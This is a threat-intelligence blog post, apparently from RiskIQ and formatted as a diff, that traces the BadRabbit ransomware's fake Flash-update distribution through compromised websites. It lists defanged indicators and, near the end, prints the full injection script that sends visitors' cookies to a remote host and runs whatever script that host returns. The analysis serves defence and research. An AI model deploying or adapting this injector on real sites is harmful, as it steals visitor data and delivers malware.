@@ -1,0 +1,121 @@
+Down the Rabbit Hole: Tracking the BadRabbit Ransomware to a Long Ongoing Campaign of Target Selection
+An extensive campaign that’s distributing the ‘BadRabbit’ ransomware, thought to be a variant of Petya and perpetrated by the same group, has been claiming victims all around the world during the past few days. Distributed through compromised websites, the campaign serves up a fake FlashPlayer update prompt to victims who are socially engineered into running the ransomware. Eset pushed a [quick initial list of IOCs ] as a warning and later followed up with more technical details of the attack.
+RiskIQ has been watching this campaign in real time through our vast data collection. Even though the BadRabbit ransomware is brand new, we can track the distribution vector back to early 2016 showing that victims were compromised long before the ransomware struck and the news cycle began. In fact, the campaign could have been originally built for something other than BadRabbit. To understand the full breadth of the infrastructure over its full lifecycle, we need to analyze the current events as they happened and then backtrack.
+Around 4:45 UTC+2 on October 24th a tweet was sent out by Jiri Kropac, an analyst working for ESET, that described an ongoing campaign in which a Petya variant similar to the June attacks in Ukraine, was distributed. According to ZDNet, Infected systems direct people to a page where they are told to pay a ransom of 0.05 bitcoin ($277, £209, AU$360) to recover their files.
+Fig-1 The Tweet by Jiri Kropac
+The screenshot showed a fake FlashPlayer update prompt on a Russian news website. After clicking the ‘Install’ button on the prompt, the user was provided the supposed Flash player update ‘install_flash_player.exe’, which came from hxxp://1dnscontrol[.]com/flash_install.php. Diving into the content of the page, we can see the following:
+Fig-2 The DOM captured by RiskIQ’s crawlers
+After cleaning up the code, we see an injected script-tag with the following content:
+Fig-3 Inject script tag
+The injected script would gather rather limited information from the visitor’s session and post it to a server hosted at 185[.]149[.]120[.]3. The server would respond with content that could be injected into the page in a new div element with the ID ‘ans’. Before the ransomware-distribution campaign went live, we kept getting the following response, which indicated that we weren’t a target according to their list:
+{“InjectionType”:0,”InjectionString”:””}
+However, on the 24th of October, these responses started changing, and the InjectionString field contained a script to show the fake FlashPlayer update prompt. 
+We noticed that we’d seen this type of behavior before. Specifically, we’ve seen this format of the data sent out to the malicious host. Below are the two next to each other:
+Fig-4 Data formatting on 10/24 and prior
+On the left, we see the dataset structure of the October 24th attack distributing BadRabbit and n the right we have an older sample RiskIQ observed in July. As you can see, the rest of the script is also very similar—most interesting to note is that while the response from the injection server can specify a value for the InjectionType field, it isn’t actually used in the October 24th version of the injector script:
+Fig-5 New script
+It seems the October 24th attack was very much focused on getting content delivered and pushed out, so the framework was minimized. Below is a snippet of the old script that checked the InjectionType and could cause either a complete redirection to a different page or inject content similar to this FlashPlayer update prompt:
+Fig-6 Old script
+What is more interesting about all of this is how long it’s all been happening. Costain Raiu tweeted some information showing an extended list of affected websites and more IPs involved in the injection. Through RiskIQ’s large datasets we were able to pull up a list of the redirection hosts and correlate this to any website on which we saw them appear. 
+First off let’s start with all the injection servers we observed and the first times we saw them active on websites:
+
+While this list is most likely incomplete, it does show that it’s part of a long-running campaign. The operators of this campaign have been able to use this position to target unique visitors based on IP space they associate with their targets. The thing we do not understand at this point is why they decided to burn this information position to mass distribute the BadRabbit ransomware rather than save it for another type of malware. The goal of the attack using ExPetya back in June was simple: cause as much disruption in the Ukraine and those associated with Ukraine as possible which also seems the case in the BadRabbit attack. 
+Another interesting aspect of these attacks is seeing where this adversary was able to target through its compromised websites. When our crawlers visit websites they create a link between the page and any of its child or parent pages it goes through. Using this structure we can build a list of affected websites when we look up the injection server IPs:
+ 
+While we have good visibility in this campaign keep in mind that there could more websites affected by these injectors. We do our best to get a good view of what’s going on on the web, but if this group abused a highly target specific website, we might have missed.
+To give others the ability to research this threat further beyond what we’ve just shown, we’re providing a copy of the basic injection script seen in July which is still used (although minimized in the recent BadRabbit distribution) :
+var REMOTE_URL = ‘<INJECTION HOST URL>’;
+var C_TIMEOUT = 20000;
+function analyze_traffic() {
+    return {
+        ‘Tr.Referer’: document.referrer,
+        ‘Tr.Agent’: navigator.userAgent,
+        ‘Tr.CookieState’: !!document.cookie,
+        ‘Tr.Cookie’: document.cookie,
+        ‘Tr.Domen’: window.location.hostname
+    };
+}
+function execute_request(post, url, callback) {
+    var xhr = init_xhr();
+    if (!!xhr) {
+        xhr.open(‘POST’, url);
+        xhr.timeout = C_TIMEOUT;
+        xhr.setRequestHeader(‘Content-Type’, ‘application/x-www-form-urlencoded’);
+        xhr.onreadystatechange = function () {
+            if (xhr.readyState == 4 && xhr.status == 200) {
+                callback(xhr.responseText);
+            }
+        };
+        var content = build_query(post);
+        xhr.send(content);
+    }
+}
+function apply_payload(response) {
+    if (response) {
+        var json_result = JSON.parse(response);
+        if (json_result) {
+            var inject_string = urldecode(json_result.InjectionString);
+            if (json_result.InjectionType === 1) {
+                window.location = inject_string;
+            } else {
+                write_on_page(inject_string);
+            }
+        }
+    }
+}
+ 
+function write_on_page(content) {
+    var div = document.createElement(‘div’);
+    div.id = ‘response’;
+    div.innerHTML = content;
+    document.body.appendChild(div);
+    var scripts = div.getElementsByTagName(‘script’);
+    if (scripts.length > 0) {
+        for (var i = 0; i < scripts.length; i++) {
+            var script = document.createElement(‘script’);
+            script.innerHTML = scripts[i].innerHTML;
+            document.body.appendChild(script);
+            scripts[i].parentNode.removeChild(scripts[i]);
+        }
+    }
+}
+ 
+function build_query(post) {
+    var post_query = [];
+    for (var k in post) {
+        if (post.hasOwnProperty(k)) {
+            post_query.push(k + ‘=’ + post[k]);
+        }
+    }
+    return post_query.join(‘&’);
+}
+ 
+function init_xhr() {
+    if (!!window.XMLHttpRequest) {
+        return new XMLHttpRequest();
+    } else if (!!window.ActiveXObject) {
+        var xhr_array = [
+            ‘Msxml2.XMLHTTP.6.0’,
+            ‘Msxml2.XMLHTTP.3.0’,
+            ‘Msxml2.XMLHTTP’,
+            ‘Microsoft.XMLHTTP’
+        ];
+        for (var i = 0; i < xhr_array.length; i++) {
+            try {
+                return new ActiveXObject(xhr_array[i]);
+            }
+            catch (e) {
+            }
+        }
+    }
+}
+ 
+function urldecode(data) {
+    return decodeURIComponent(data).replace(/\+/g, ‘%20’);
+}
+ 
+// Execute request
+var traffic = analyze_traffic();
+execute_request(traffic, REMOTE_URL, apply_payload);
+The group behind the BadRabbit ransomware has been active for quite a while longer. ESET linked a lot of the attacks around the activity in the Ukraine to a group they’ve named ‘Telebots.’ It seems the reach of this group is quite broad with access to victims and targets inside and outside Ukraine. With RiskIQ, customers can continuously monitor threats to their organization and automatically track changes to their web properties such as injects from BadRabbit., so your team can see and take action on emerging threats as they develop.
+To see a full list of IOCs for this campaign, check out the RiskIQ Community Public Project here.
